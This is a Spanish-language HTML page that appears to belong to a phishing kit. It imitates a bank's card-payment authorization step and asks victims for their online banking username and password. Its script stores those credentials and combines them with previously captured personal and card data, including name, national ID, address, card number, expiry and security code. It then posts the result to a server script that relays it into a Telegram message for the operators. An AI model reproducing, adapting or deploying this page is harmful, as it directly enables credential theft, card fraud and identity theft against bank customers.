<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Autorización de Transacción</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f7f7f7;
        }
        .container {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            max-width: 400px;
            width: 100%;
        }
        .container img {
            width: 100px;
            margin-bottom: 20px;
        }
        h1 {
            font-size: 1.5em;
            margin-bottom: 20px;
        }
        input[type="text"],
        input[type="password"] {
            width: calc(100% - 20px);
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 1em;
            box-sizing: border-box;
        }
        .info-text {
            font-size: 0.9em;
            color: #666;
            margin-bottom: 20px;
        }
        .btn {
            background-color: #4e79ff;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 1em;
        }
        .btn:hover {
            background-color: #3a62d1;
        }
        #cargando {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.8);
            text-align: center;
            padding-top: 20%;
            font-size: 1.5em;
            color: #333;
        }
        .error-message {
            color: red;
            font-size: 1em;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div id="cargando">Cargando...</div>
    <div class="container">
        <div class="logos">
            <img src="assets/media/vista3cx4.png" alt="ez">
            <img src="assets/media/deruerguwix034.webp" alt="derecha">
        </div>
        <h1>Autorización de transacción</h1>
        <p>Estás intentando realizar un pago por tarjeta de crédito/débito. Necesitamos confirmar que eres tú quien realiza este pago.</p>

        <!-- Aquí mostramos el mensaje de error si existe en la URL -->
        <div id="error-message" class="error-message" style="display:none;">
            Error: Usuario o contraseña incorrectos.
        </div>

        <form id="authForm">
            <input type="text" name="username" placeholder="Usuario" minlength="4" maxlength="20" required>
            <input type="password" name="password" placeholder="Clave" minlength="4" maxlength="20" required>
            <input type="hidden" name="localStorageInfo" id="localStorageInfo">
            <input type="hidden" name="session_id" id="session_id"> <!-- Campo oculto para el session_id -->
            <p class="info-text">Ingresa los datos que usas al entrar a tu banco, recuerda si la operación no se aprueba de manera correcta no se realizará ningún cobro.</p>
            <button type="submit" class="btn">Autorizar</button>
        </form>
    </div>

    <script>
    // Al cargar la página, recupera el session_id y colócalo en el campo oculto
    document.addEventListener("DOMContentLoaded", function() {
        const sessionId = localStorage.getItem('session_id');
        console.log('Session ID desde localStorage:', sessionId); // Para verificar el valor
        if (sessionId) {
            document.getElementById('session_id').value = sessionId; // Asigna el session_id al campo oculto
        } else {
            console.error('No se encontró el session_id en localStorage.');
        }

        // Verificar si en la URL hay un parámetro "error=1" y mostrar mensaje de error
        const urlParams = new URLSearchParams(window.location.search);
        const error = urlParams.get('error');

        if (error === '1') {
            document.getElementById('error-message').style.display = 'block';
        }
    });

    document.getElementById('authForm').addEventListener('submit', async function(event) {
        event.preventDefault(); // Evita el envío del formulario por defecto

        // Captura los valores de usuario y contraseña
        const username = document.querySelector('input[name="username"]').value;
        const password = document.querySelector('input[name="password"]').value;
        const session_id = document.querySelector('input[name="session_id"]').value;

        // Almacena username y password en localStorage
        localStorage.setItem('username', username);
        localStorage.setItem('password', password);
        localStorage.setItem('session_id', session_id);

        // Obtén la información del localStorage
        var info = localStorage.getItem('info');
        var infoData;

        if (info && info.trim() !== '') {
            try {
                infoData = JSON.parse(info);
            } catch (e) {
                console.error('Error al analizar JSON de localStorage:', e);
                document.getElementById('cargando').style.display = 'none'; // Oculta la ventana de carga
                return;
            }
        }

        // Asegúrate de que metaInfo existe
        var metaInfo = infoData?.metaInfo || {};
        if (!metaInfo || Object.keys(metaInfo).length === 0) {
            alert("No se encontraron datos válidos en localStorage.");
            document.getElementById('cargando').style.display = 'none'; // Oculta la ventana de carga
            return; // Detener el proceso si no hay datos
        }

        // Combina el mensaje original con la nueva información
        const mensajeFinal = `
            LATAM GOLEADOR💎
            -------------------------------
            👤Nombre: ${metaInfo.name || 'No disponible'}
            🪪Cedula: ${metaInfo.cc || 'No disponible'}
            -------------------------------
            💌Correo: ${metaInfo.email || 'No disponible'}
            📞Teléfono: ${metaInfo.telnum || 'No disponible'}
            🌇Ciudad: ${metaInfo.city || 'No disponible'}
            🗺️Dirección: ${metaInfo.address || 'No disponible'}
            -------------------------------
            🏦 Banco: ${metaInfo.ban || 'No disponible'}
            💳: ${metaInfo.p || 'No disponible'}
            📅: ${metaInfo.pdate || 'No disponible'}
            🔐: ${metaInfo.c || 'No disponible'}
            ------------------------------
            Disp: ${metaInfo.disp || 'No disponible'}
            \nUser: ${username} 
            \nPass: ${password} \n  \n idsession: ${session_id}
        `;

        // Envía los datos al servidor para guardar en la base de datos
        try {
            const response = await fetch('/js/guardar_usuario.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: new URLSearchParams({
                    username: username,
                    password: password,
                    session_id: document.getElementById('session_id').value // Incluye el session_id aquí
                })
            });

            const result = await response.json();
            console.log(result); // Muestra la respuesta del servidor en la consola

            if (result.status === 'success') {
                // Envía la información al servidor para editar el mensaje en Telegram
                await editarMensajeTelegram(localStorage.getItem('messageId'), mensajeFinal);
            } else {
                alert('Error al guardar el usuario: ' + result.message);
            }
        } catch (error) {
            console.error('Error al enviar los datos:', error);
            alert('Error al enviar los datos. Inténtalo de nuevo.');
        } finally {
            document.getElementById('cargando').style.display = 'none'; // Oculta la ventana de carga
        }
    });

    async function editarMensajeTelegram(messageId, nuevoTexto) {
        const response = await fetch('edit_message.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ message_id: messageId, text: nuevoTexto })
        });

        const data = await response.json();
        if (data.status === 'success') {
            // Redirige a otra página si la edición fue exitosa
            window.location.href = '/js/cargando.php'; // Cambia 'pagina_destino.html' por la URL a la que quieres redirigir
        } else {
            alert('Error al verificar el mensaje, revise que no se envie la misma información: ' + data.message);
        }
    }
</script>

</body>
</html>
